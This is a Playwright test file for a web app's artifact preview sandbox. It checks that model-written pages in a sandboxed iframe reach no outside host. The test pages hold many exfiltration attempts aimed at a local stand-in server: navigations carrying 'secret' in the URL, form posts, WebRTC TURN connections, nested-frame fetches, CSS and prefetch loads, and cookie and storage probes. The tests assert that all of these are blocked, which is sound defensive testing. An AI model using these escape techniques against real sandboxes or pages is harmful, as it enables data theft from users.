// The artifact preview sandbox in a real browser (spec §4.1, §9): a page the
// model wrote, trying every way out it has, must reach no host. The test
// serves a parent page with the app's own response CSP (withFrameAncestors)
// and the preview frame exactly as SandboxFrame renders it, and counts every
// TCP connection to a second local "outside" server.
import http from "node:http";
import net from "node:net";
import type { AddressInfo } from "node:net";

import { expect, test } from "@playwright/test";

import { buildSandboxSrcdoc } from "../src/components/conversation/artifacts/sandbox-srcdoc";
import { withFrameAncestors } from "../src/server/frame-ancestors";

let outside: net.Server;
let app: http.Server;
let hits: string[] = [];
let OUT = "";
let APP = "";
const pages = new Map<string, string>();

function attr(value: string): string {
  return value.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
}

/** The parent: collects the frame's messages and CSP violations. */
function parentPage(artifact: string): string {
  return (
    "<!doctype html><body><script>window.said=[];" +
    'addEventListener("message",e=>said.push(String(e.data)));' +
    'document.addEventListener("securitypolicyviolation",e=>said.push("violation "+e.violatedDirective));' +
    `</script><iframe sandbox="allow-scripts" srcdoc="${attr(buildSandboxSrcdoc(artifact))}"></iframe></body>`
  );
}

test.beforeAll(async () => {
  outside = net.createServer((socket) => {
    hits.push("connection");
    socket.on("data", (d) => hits.push(String(d).split("\r\n")[0]));
    socket.on("error", () => undefined);
    setTimeout(() => socket.destroy(), 50);
  });
  await new Promise<void>((r) => outside.listen(0, "127.0.0.1", r));
  OUT = `127.0.0.1:${(outside.address() as AddressInfo).port}`;
  app = http.createServer(async (req, res) => {
    const body = pages.get(req.url ?? "") ?? "";
    const headed = await withFrameAncestors(
      new Request(`http://localhost${req.url}`),
      new Response(body, { headers: { "content-type": "text/html; charset=utf-8" } }),
      {},
    );
    res.writeHead(200, Object.fromEntries(headed.headers));
    res.end(await headed.text());
  });
  await new Promise<void>((r) => app.listen(0, "localhost", r));
  APP = `http://localhost:${(app.address() as AddressInfo).port}`;
});

test.afterAll(() => {
  app.close();
  outside.close();
});

test.beforeEach(() => {
  hits = [];
});

/** Shows `artifact`, waits, and returns what the frame said. */
async function run(page: import("@playwright/test").Page, name: string, artifact: string) {
  pages.set(`/${name}`, parentPage(artifact));
  await page.goto(`${APP}/${name}`);
  await page.waitForTimeout(1200);
  return page.evaluate(() => (window as unknown as { said: string[] }).said);
}

const SAY = 'const say=(m)=>parent.postMessage(m,"*");';

test("renders, and the page reaches nothing of the parent", async ({ page }) => {
  const said = await run(
    page,
    "parent",
    `<script>${SAY}
    const tries=(n,f)=>{try{f();say(n+" OPEN")}catch{say(n+" blocked")}};
    tries("parent.document",()=>parent.document.title);
    tries("top.location",()=>top.location.href);
    tries("localStorage",()=>localStorage.length);
    tries("cookie",()=>document.cookie);
    say("open "+(window.open("http://${OUT}/popup")===null?"blocked":"OPEN"));
    for (const n of ["fetch","XMLHttpRequest","WebSocket","EventSource","RTCPeerConnection","webkitRTCPeerConnection","RTCDataChannel"]) say(n+" "+typeof window[n]);
    say("sendBeacon "+typeof navigator.sendBeacon);
    try{delete window.fetch;Object.defineProperty(window,"fetch",{value:1})}catch{} say("restored "+typeof window.fetch);
    </script>`,
  );
  expect(said).toEqual(
    expect.arrayContaining([
      "parent.document blocked",
      "top.location blocked",
      "localStorage blocked",
      "cookie blocked",
      "open blocked",
      "fetch undefined",
      "XMLHttpRequest undefined",
      "WebSocket undefined",
      "EventSource undefined",
      "RTCPeerConnection undefined",
      "webkitRTCPeerConnection undefined",
      "RTCDataChannel undefined",
      "sendBeacon undefined",
      "restored undefined",
    ]),
  );
  expect(page.url()).toMatch(/^http:\/\/localhost/);
  expect(hits).toEqual([]);
});

test("cannot navigate itself to another host", async ({ page }) => {
  for (const [name, how] of [
    ["href", `location.href="http://${OUT}/?d=secret"`],
    ["replace", `location.replace("http://${OUT}/?d=secret")`],
    [
      "refresh",
      `const m=document.createElement("meta");m.httpEquiv="refresh";m.content="0;url=http://${OUT}/?d=secret";document.head.append(m)`,
    ],
    [
      "click",
      `const a=document.createElement("a");a.href="http://${OUT}/?d=secret";document.body.append(a);a.click()`,
    ],
    ["top", `try{top.location="http://${OUT}/?d=secret"}catch{}`],
  ]) {
    const said = await run(page, `nav-${name}`, `<script>setTimeout(()=>{${how}},20)</script>`);
    expect(hits, name).toEqual([]);
    if (name !== "top") expect(said, name).toContain("violation frame-src");
    expect(page.url(), name).toMatch(/^http:\/\/localhost/);
  }
  // Markup that would do it before any script: stripped, and blocked anyway.
  const said = await run(
    page,
    "nav-markup",
    `<meta http-equiv="refresh" content="0;url=http://${OUT}/?d=1"><base href="http://${OUT}/"><a href="x" id="a">x</a><script>document.getElementById("a").click()</script>`,
  );
  expect(hits).toEqual([]);
  expect(said).not.toContain("violation base-uri");
});

test("gets no fresh window from a nested frame", async ({ page }) => {
  const rtc = `new RTCPeerConnection({iceServers:[{urls:"turn:${OUT}?transport=tcp",username:"u",credential:"c"}]})`;
  const nested = `<script>const pc=${rtc};pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o));fetch("http://${OUT}/n").catch(()=>0)</script>`;
  const nestedJs = JSON.stringify(nested).replace(/<\//g, "<\\/");
  const said = await run(
    page,
    "nested",
    `<script>${SAY}
    const f=document.createElement("iframe");f.srcdoc=${nestedJs};document.body.append(f);
    try{say("nested rtc "+typeof window[0].RTCPeerConnection)}catch{say("nested window blocked")}
    const g=document.createElement("iframe");document.body.append(g);
    try{new window[1].RTCPeerConnection({});say("blank rtc OPEN")}catch{say("blank window blocked")}
    setTimeout(()=>say("frames left "+document.querySelectorAll("iframe").length),100);
    </script><iframe srcdoc="${attr(nested)}"></iframe>`,
  );
  expect(said).toEqual(
    expect.arrayContaining(["nested window blocked", "blank window blocked", "frames left 0"]),
  );
  expect(hits).toEqual([]);
});

test("loads nothing through CSS, hints, forms or media", async ({ page }) => {
  await run(
    page,
    "loads",
    `<link rel="dns-prefetch" href="//${OUT}"><link rel="preconnect" href="http://${OUT}">
    <link rel="prefetch" href="http://${OUT}/p"><link rel="stylesheet" href="http://${OUT}/s.css">
    <style>@import url("http://${OUT}/i.css");body{background:url("http://${OUT}/b.png")}
    @font-face{font-family:x;src:url("http://${OUT}/f.woff")}</style><p style="font-family:x">x</p>
    <img src="http://${OUT}/i.png"><video src="http://${OUT}/v.mp4"></video>
    <form id="f" action="http://${OUT}/f" method="post"><input name="q" value="secret"></form>
    <script>
    for (const rel of ["preconnect","prefetch","dns-prefetch","preload"]) {
      const l=document.createElement("link");l.rel=rel;l.as="image";l.href="http://${OUT}/"+rel;document.head.append(l);
    }
    document.getElementById("f").submit();
    new Image().src="http://${OUT}/js.png";
    </script>`,
  );
  expect(hits).toEqual([]);
});
